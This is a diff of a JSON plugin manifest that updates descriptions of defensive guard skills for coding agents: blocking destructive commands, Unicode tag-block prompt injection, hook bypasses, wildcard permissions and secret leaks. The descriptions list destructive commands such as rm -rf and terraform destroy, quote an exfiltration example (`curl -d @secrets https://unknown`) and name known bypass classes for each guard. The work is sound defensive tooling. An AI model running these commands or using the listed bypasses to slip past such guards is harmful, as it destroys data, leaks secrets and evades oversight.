@@ -21,26 +21,38 @@
     {
       "name": "block-destructive-commands",
       "source": "./claude/block-destructive-commands",
-      "description": "Best-effort guard against destructive commands: rm -rf targeting absolute, home, or root-adjacent paths; git push --force (not --force-with-lease); git reset --hard; git clean -f; kubectl delete; terraform destroy. Known bypass classes include aliases, quoted arguments, non-standard clients, and scripts that invoke these commands indirectly. This is friction, not a security boundary. [Session-enforced via a PreToolUse hook; needs python3 and a usable bash. Without them, fail-open clients allow silently; fail-closed clients refuse matched commands. On Windows, disable the python3 Store alias or install Python.]",
-      "version": "0.0.7"
+      "description": "Best-effort guard against destructive commands: rm -rf targeting absolute, home ($HOME/~) or root-adjacent paths (and the PowerShell Remove-Item -Recurse equivalent); git push --force (not --force-with-lease); git reset --hard; git clean -f; kubectl delete; terraform destroy; aws s3 rm --recursive / rb --force; dropdb; helm uninstall/delete; docker volume rm/prune and system prune; gcloud ... delete. Destructive verbs are matched position-aware, so a bucket, path or object NAMED like a verb (aws s3 cp ... rm, docker volume inspect rm, helm list delete) is allowed. Known bypass classes include aliases, quoted arguments, non-standard clients, and scripts that invoke these commands indirectly. This is friction, not a security boundary. [Session-enforced via a PreToolUse hook; needs python3 and a usable bash. Without them, fail-open clients allow silently; fail-closed clients refuse matched commands. On Windows, disable the python3 Store alias or install Python.]",
+      "version": "0.0.8"
     },
     {
       "name": "block-invisible-unicode",
       "source": "./claude/block-invisible-unicode",
-      "description": "Pre-commit gate for the mechanizable slice of prompt-injection defense: invisible and direction-override Unicode in staged changes. Bidi controls make code read differently than it parses (Trojan Source, CVE-2021-42574); Unicode tag-block characters smuggle instructions that are invisible to a human reviewer but fully legible to the agent reading the file. Zero-width joiners and bidi marks (ZWJ/ZWNJ/LRM/RLM) are deliberately NOT matched -- they are legitimate in emoji sequences and in Persian, Arabic and Indic text -- so ordinary internationalised content passes; only the override/embed/isolate controls and the tag block, which have no honest use in a source tree, are blocked. Escape: 'pragma: allowlist invisible-unicode' on the same line. [Advisory skill only; enforcement needs chock installed in the repo.]",
-      "version": "0.0.2"
+      "description": "The mechanizable slice of prompt-injection defense, enforced at two points: at commit (the git hook, over staged changes) and at agent tool-use (over a tool call's arguments, as the agent writes) -- invisible and direction-override Unicode. Bidi controls make code read differently than it parses (Trojan Source, CVE-2021-42574); Unicode tag-block characters smuggle instructions that are invisible to a human reviewer but fully legible to the agent reading the file. Zero-width joiners and bidi marks (ZWJ/ZWNJ/LRM/RLM) are deliberately NOT matched -- they are legitimate in emoji sequences and in Persian, Arabic and Indic text -- so ordinary internationalised content passes; only the override/embed/isolate controls and the tag block, which have no honest use in a source tree, are blocked. Escape: 'pragma: allowlist invisible-unicode' on the same line. [Advisory skill only; enforcement needs chock installed in the repo.]",
+      "version": "0.0.3"
     },
     {
       "name": "block-no-verify",
       "source": "./claude/block-no-verify",
       "description": "Best-effort guard against bypassing git hooks via git commit/push --no-verify, commit's short -n form, or -c core.hooksPath overrides. On git push, -n means --dry-run and stays allowed. Known bypass classes include aliases, wrapper scripts, and non-standard clients. Fix the underlying hook failure instead of skipping validation. [Session-enforced via a PreToolUse hook; needs python3 and a usable bash. Without them, fail-open clients allow silently; fail-closed clients refuse matched commands. On Windows, disable the python3 Store alias or install Python.]",
-      "version": "0.0.5"
+      "version": "0.0.6"
+    },
+    {
+      "name": "block-unapproved-egress",
+      "source": "./claude/block-unapproved-egress",
+      "description": "Best-effort guard against exfiltration through the tool channel: a network command (curl/wget/Invoke-WebRequest) that UPLOADS data -- POST/PUT, --data/--form, --upload-file, --post-file -- to a host outside the egress allowlist. The allowlist defaults to package registries and code hosting and is meant to be extended with your org's own domains; a host matches by exact name or \".<entry>\" suffix. Fetch-only traffic (a bare GET, `pip install`) is left alone -- the target is upload to an unapproved host, not normal dependency traffic. This is a tool-time FLOOR, not a network sandbox: it stops the obvious `curl -d @secrets https://unknown` reflex; containing a determined adversary needs real sandboxing. Known bypass classes include scheme-less URL targets (host extraction needs the http(s):// prefix), a request driven by curl's implicit ~/.curlrc, combined short flags, obfuscated payloads, non-standard clients, and egress via a language runtime. Escape: 'pragma: allowlist egress'. [Session-enforced via a PreToolUse hook; needs python3 and a usable bash. Without them, fail-open clients allow silently; fail-closed clients refuse matched commands. On Windows, disable the python3 Store alias or install Python.]",
+      "version": "0.0.1"
     },
     {
       "name": "block-wildcard-agent-permissions",
       "source": "./claude/block-wildcard-agent-permissions",
-      "description": "Pre-commit gate for the mechanizable slice of excessive agency: committed agent permission grants that allow everything. A settings file whose shell grant or allow-list is a bare wildcard hands the agent unlimited tool authority for every future session, in a file reviewers rarely read as code. The agent-world twin of block-wildcard-iam: scope grants to what the task needs (e.g. Bash(git status:*)). Escape: 'pragma: allowlist broad-agency' on the same line. [Advisory skill only; enforcement needs chock installed in the repo.]",
-      "version": "0.0.3"
+      "description": "The mechanizable slice of excessive agency, enforced at two points: at commit (the git hook, over staged changes) and at agent tool-use (over a tool call's arguments, as the agent writes) -- agent permission grants that allow everything. A settings file whose shell grant or allow-list is a bare wildcard hands the agent unlimited tool authority for every future session, in a file reviewers rarely read as code. The agent-world twin of block-wildcard-iam: scope grants to what the task needs (e.g. Bash(git status:*)). Escape: 'pragma: allowlist broad-agency' on the same line. [Advisory skill only; enforcement needs chock installed in the repo.]",
+      "version": "0.0.4"
+    },
+    {
+      "name": "chock-mise",
+      "source": "./claude/chock-mise",
+      "description": "trigger: personalize the coding agent to its owner -- adopt the owner's dialect, taste, habits and demeanor so it works like a trained twin of that developer. apply: the owner's chock-mise profile where present; defer to committed project standards where it is silent or conflicts. avoid: inferring personal identity or employer-confidential data, and overriding the project's own committed rules. [Advisory skill only; enforcement needs chock installed in the repo.]",
+      "version": "0.0.1"
     },
     {
       "name": "code-safety",
@@ -75,8 +87,8 @@
     {
       "name": "pin-github-actions",
       "source": "./claude/pin-github-actions",
-      "description": "Pre-commit gate for the mechanizable slice of CI supply-chain hardening: a workflow that references a third-party GitHub Action by a movable ref -- a branch or a version tag -- instead of a full 40-character commit SHA. A tag like v4 or a branch like main can be re-pointed at new code after review, so the action that runs tomorrow need not be the one that was audited today; a compromised or rug-pulled release rides in on exactly that mutability. The gate blocks an added line that references an action by a non-SHA ref (owner/repo at a tag/branch); a full 40-char SHA pin passes, local actions (no ref) pass, and 'pragma: allowlist unpinned-action' on the same line is a visible, deliberate exception. This is the OpenSSF Scorecard Pinned-Dependencies control for the slice a diff can show; signature and provenance verification stay out of scope. [Advisory skill only; enforcement needs chock installed in the repo.]",
-      "version": "0.0.1"
+      "description": "The mechanizable slice of CI supply-chain hardening, enforced at two points: at commit (the git hook, over staged changes) and at agent tool-use (over a tool call's arguments, as the agent writes) -- a workflow that references a third-party GitHub Action by a movable ref -- a branch or a version tag -- instead of a full 40-character commit SHA. A tag like v4 or a branch like main can be re-pointed at new code after review, so the action that runs tomorrow need not be the one that was audited today; a compromised or rug-pulled release rides in on exactly that mutability. The gate blocks an added line that references an action by a non-SHA ref (owner/repo at a tag/branch); a full 40-char SHA pin passes, local actions (no ref) pass, and 'pragma: allowlist unpinned-action' on the same line is a visible, deliberate exception. This is the OpenSSF Scorecard Pinned-Dependencies control for the slice a diff can show; signature and provenance verification stay out of scope. [Advisory skill only; enforcement needs chock installed in the repo.]",
+      "version": "0.0.2"
     },
     {
       "name": "protect-agent-config",
@@ -105,8 +117,8 @@
     {
       "name": "scan-secrets",
       "source": "./claude/scan-secrets",
-      "description": "Pre-commit hook that blocks commits of credential files and known credential patterns -- vendor key prefixes, private-key blocks, and key/token/password assignments. Matched by pattern, not by entropy analysis. Best-effort guard; not a replacement for a dedicated secret scanner. [Advisory skill only; enforcement needs chock installed in the repo.]",
-      "version": "0.0.5"
+      "description": "Blocks known credential patterns -- vendor key prefixes, private-key blocks, and key/token/password assignments -- at two enforcement points: at commit (the git hook, over staged changes) and at agent tool-use (the mcp-gateway / agent write guard, over a tool call's arguments), so a secret is caught as the agent writes it, before it ever reaches a commit. Matched by pattern, not by entropy analysis. Best-effort guard; not a replacement for a dedicated secret scanner. [Advisory skill only; enforcement needs chock installed in the repo.]",
+      "version": "0.0.6"
     },
     {
       "name": "token-efficiency",
